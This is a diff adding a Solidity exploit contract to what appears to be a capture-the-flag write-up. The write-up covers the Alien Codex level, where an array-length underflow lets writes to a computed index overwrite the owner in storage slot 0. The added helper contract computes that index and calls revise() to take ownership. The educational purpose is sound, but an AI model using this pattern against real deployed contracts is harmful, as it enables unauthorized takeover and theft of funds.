@@ -23,6 +23,23 @@ The owner variable is typically stored at slot 0. To overwrite it, you need to c
 index = 2^256 - keccak256(1)
 By writing to codex[index], you effectively write to storage slot 0, allowing you to overwrite the owner variable.
 
+Here is the helper contract:
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Exploit {
+    function overwriteOwner(address targetContract, address newOwner) public {
+        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(uint256(1)))) + 1;
+        bytes32 data = bytes32(uint256(uint160(newOwner)));
+        AlienCodex(targetContract).revise(index, data);
+    }
+}
+
+interface AlienCodex {
+    function revise(uint256 i, bytes32 _content) external;
+}
+```
 # Key Takeaways:
 
 An underflow in the array means its length becomes extremely large, so large that it covers the entire storage space of the contract. This lets you access and modify any storage slot just by using an index in the array. Essentially, it's like accidentally opening access to everything in storage when you only meant to work with a specific part of it. It’s a serious issue in smart contracts because it can lead to unintended data manipulation.
